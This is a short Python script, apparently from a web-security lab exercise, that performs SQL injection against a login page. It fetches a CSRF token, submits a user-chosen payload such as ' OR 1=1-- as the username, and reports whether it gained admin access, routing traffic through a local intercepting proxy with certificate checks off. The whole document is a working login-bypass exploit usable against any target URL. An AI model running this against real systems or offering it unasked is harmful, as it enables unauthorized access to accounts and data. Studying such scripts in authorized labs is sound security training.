import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    return csrf

def exploit_sqli(url, payload):
    s = requests.Session()
    uri = '/login'
    csrf = get_csrf_token(s, url + uri)
    data = {'username': payload, 
            'password': 'password', 
            'csrf': csrf}
    r = s.post(url + uri, data=data, verify=False, proxies=proxies)
    if "Invalid username or password." in r.text:
        return False
    return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"Usage: {sys.argv[0]} <url> <payload>")
        print(f"Example: {sys.argv[0]} http://www.example.com \"' OR 1=1--\"")
        sys.exit(-1)


    if exploit_sqli(url, payload):
        print("[+] SQL injection successful! You have admin rights!")
    else:
        print("[-] SQL injection unsuccessful!")